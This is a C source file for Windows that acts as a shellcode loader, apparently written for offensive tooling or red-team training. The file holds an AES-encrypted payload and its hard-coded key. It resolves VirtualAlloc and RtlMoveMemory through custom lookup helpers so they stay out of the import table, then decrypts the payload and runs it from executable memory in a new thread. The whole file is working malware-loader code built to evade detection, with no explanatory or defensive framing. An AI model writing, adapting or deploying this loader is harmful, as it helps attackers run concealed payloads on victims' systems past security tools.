#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "helpers.h"

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}

unsigned char payload[] = { 0xfa, 0x53, 0x63, 0xfb, 0xdb, 0x2, 0x37, 0x18, 0x18, 0x99, 0xfd, 0x58, 0x87, 0xc8, 0x39, 0xc1, 0xd0, 0xea, 0x37, 0xb5, 0xdc, 0x2c, 0xb6, 0x10, 0x42, 0xdf, 0xee, 0xd6, 0xa1, 0x58, 0x2d, 0x79, 0x65, 0x4f, 0xd2, 0x62, 0x2f, 0x6a, 0xd6, 0xe6, 0x8b, 0x8, 0x71, 0x51, 0xc, 0xcf, 0x55, 0xd8, 0x12, 0xd2, 0x2, 0xc9, 0xc2, 0x55, 0x57, 0x41, 0x1a, 0xff, 0xb, 0x1, 0x3a, 0x24, 0xab, 0xb9, 0xae, 0x83, 0xef, 0xb2, 0xbb, 0xae, 0x69, 0xef, 0xc, 0xb, 0x74, 0x58, 0x89, 0x54, 0x2, 0xa5, 0x2e, 0xc1, 0xb5, 0x21, 0xce, 0xc5, 0x2e, 0x63, 0x1f, 0x93, 0x10, 0x85, 0xdb, 0x3e, 0x48, 0xa3, 0xf0, 0x8f, 0xdb, 0xf, 0xea, 0xab, 0x5f, 0x35, 0x63, 0x2b, 0x23, 0x7c, 0x81, 0x1d, 0xb1, 0xb0, 0x57, 0xdd, 0x6e, 0x85, 0x82, 0x2, 0x58, 0x4d, 0x41, 0xe9, 0x5d, 0x1a, 0x81, 0x80, 0x8c, 0x71, 0xbb, 0x8f, 0x4a, 0xf0, 0xe4, 0xc4, 0x80, 0xdc, 0xd, 0xd5, 0x17, 0x6, 0xe6, 0x5d, 0xeb, 0x5, 0xb7, 0xdb, 0x2a, 0xb3, 0xe3, 0xf4, 0xe0, 0x49, 0xb8, 0xc6, 0x6e, 0x29, 0xf2, 0xd1, 0x92, 0x7a, 0x76, 0xa6, 0xa1, 0x8b, 0x19, 0xe0, 0x91, 0x2f, 0x2e, 0x6f, 0x85, 0x1f, 0x62, 0x18, 0x58, 0x2f, 0xe5, 0x19, 0xed, 0xc3, 0x2, 0x35, 0x81, 0x1e, 0xea, 0x20, 0x8f, 0x89, 0x3b, 0x77, 0xc9, 0xdb, 0xc8, 0x7c, 0xb7, 0x5b, 0x69, 0x5e, 0xcc, 0xe, 0x96, 0xc1, 0x66, 0x96, 0x7d, 0xf, 0x1d, 0xab, 0x4c, 0x93, 0x62, 0x7a, 0x67, 0xa5, 0x6f, 0x6e, 0x93, 0xe5, 0xea, 0xe6, 0x3f, 0xbc, 0xc5, 0x97, 0x2f, 0x22, 0xd0, 0x2a, 0x78, 0xb4, 0xaf, 0x3b, 0xef, 0x45, 0xc3, 0x53, 0x7f, 0x2f, 0x2b, 0x64, 0x46, 0x3b, 0xe5, 0x85, 0xbf, 0x71, 0x47, 0x1a, 0x34, 0x93, 0x68, 0xaa, 0x47, 0x14, 0x75, 0xf0, 0x71, 0xfb, 0x98, 0x91, 0x5b, 0x22, 0xaf, 0x28, 0xf7, 0xa2, 0xa2, 0xc4, 0xc7, 0x50, 0x3b, 0x51, 0xd4, 0x3f, 0xc5, 0x26, 0x1b, 0x73, 0x38, 0xfa, 0xb1, 0xfb, 0x78, 0x8c, 0x18, 0x74, 0xe7, 0xf9, 0x4d, 0x94, 0xa0, 0x3b, 0xf1, 0xe9, 0x31, 0x5d, 0x6d, 0x3f, 0xba, 0x54, 0xf5, 0x6e, 0x55, 0xa2, 0xe5, 0xc3, 0xe3, 0x3a, 0x4a, 0x96, 0xe3, 0x2, 0xa1, 0xd0, 0x90, 0xb, 0xb5, 0x35, 0x92, 0x81, 0x38, 0x30, 0xb0, 0x39, 0x94, 0x21, 0x2a, 0x91, 0x14, 0x10, 0x28, 0xa, 0xa, 0x2, 0x72, 0xf3, 0xf6, 0xc9, 0xa6, 0x27, 0x9f, 0x3c, 0xf8, 0x3c, 0x79, 0xb7, 0xfc, 0x9f, 0xf0, 0x3e, 0x53, 0x3d, 0x57, 0x63, 0xe6, 0x20, 0x8c, 0x41, 0x4b, 0xdd, 0xb9, 0x46, 0x5a, 0x5a, 0x6d, 0x1e, 0x5c, 0x37, 0x44, 0x9a, 0x86, 0x7, 0xc0, 0xc8, 0x93, 0x82, 0x82, 0xea, 0xb9, 0xcd, 0x47, 0x5e, 0x61, 0xbd, 0x25, 0xf, 0x9b, 0xd, 0xac, 0x2a, 0x4, 0x34, 0x9b, 0xa2, 0x0, 0x69, 0xe8, 0x76, 0x9f, 0xf6, 0x3c, 0xc0, 0xb, 0x20, 0xd3, 0x94, 0xb5, 0x5e, 0xce, 0xea, 0xbe, 0x50, 0x6b, 0x64, 0xf5, 0x25, 0xe9, 0xb2, 0xc7, 0x94, 0x2b, 0xad, 0xdc, 0xc6, 0x27, 0xe6, 0x56, 0x67, 0x35, 0xea, 0xc4, 0xa3, 0xbf, 0xc6, 0xc1, 0xbe, 0xb0, 0xf5, 0x68, 0x2b, 0xa2, 0x83, 0x9f, 0x6b, 0xba, 0x7e, 0x14, 0xf2, 0xb7, 0x17, 0xa6, 0x51, 0x37, 0xb6, 0x74, 0xcb, 0xac, 0x32, 0xe7, 0x47, 0x8e, 0xf8, 0x80, 0x30 };
unsigned char key[] = { 0x12, 0x4d, 0x3b, 0xa4, 0xdb, 0x63, 0x47, 0xf, 0xe, 0x8, 0x96, 0x8, 0xd2, 0x9e, 0x62, 0x90 };	


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
	unsigned int payload_len = sizeof(payload);
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	pRtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return 0;
}
